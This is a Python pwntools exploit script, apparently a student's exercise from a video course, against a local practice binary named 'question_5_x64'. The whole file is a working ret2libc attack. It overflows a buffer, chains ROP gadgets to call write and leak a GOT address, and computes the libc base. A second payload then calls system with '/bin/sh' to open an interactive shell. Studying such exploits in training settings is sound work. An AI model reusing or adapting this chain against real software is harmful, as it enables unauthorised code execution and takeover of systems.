'''
Author: 白银
Date: 2022-08-30 17:34:37
LastEditTime: 2022-08-30 19:58:09
LastEditors: 白银
Description: https://www.bilibili.com/video/BV1mr4y1Y7fW?p=20&vd_source=12b05ccdf92b6ba12a9bd0495b00017a&t=4695.7 大概这么个意思，代码里整个没有sh的话
'''
from pwn import *

context(log_level = 'debug', arch = 'amd64', os = 'linux')

pwnfile = './question_5_x64'
io = process(pwnfile)

elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 0x10

pop_rdi_ret = 0x4011fb
pop_rsi_r15_ret = 0x4011f9

leak_func_got = 0x404018

# bin_sh_addr = 0x404040

return_addr = elf.symbols['dofunc']
# return_addr = 0x401142
write_sym = elf.symbols['write']

# payload = b'a' * padding + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(return_addr)
payload = flat(['a' * padding, pop_rdi_ret, 1, pop_rsi_r15_ret, leak_func_got, 0xdeadbeef])
# payload += flat[write_sym]
payload += p64(write_sym) + p64(return_addr)

delimiter = 'input:'

io.sendlineafter(delimiter, payload)
io.recvuntil('byebye')

write_addr = u64(io.recv().ljust(8, b'\x00'))
print('write_addr: ', hex(write_addr))

write_offset = 0xEA440 #地址来自ida看ldd 程序名 指向的第一行的libc.so文件，下同
libc_addr = write_addr - write_offset
print('libc_addr: ', hex(libc_addr))

system_offset = 0x45880
system_addr = libc_addr + system_offset
print('system_addr: ', hex(system_addr))

bin_sh_offset = 0x194882#system里面shift+f12找/bin/sh
bin_sh_addr = libc_addr + bin_sh_offset
print('bin_sh_addr: ', hex(bin_sh_addr))

gdb.attach(io)
pause()

payload2 = flat(['a' * padding, pop_rdi_ret, bin_sh_addr, system_addr])

delimiter = 'input:'

io.sendlineafter(delimiter, payload2)

pause()

io.interactive()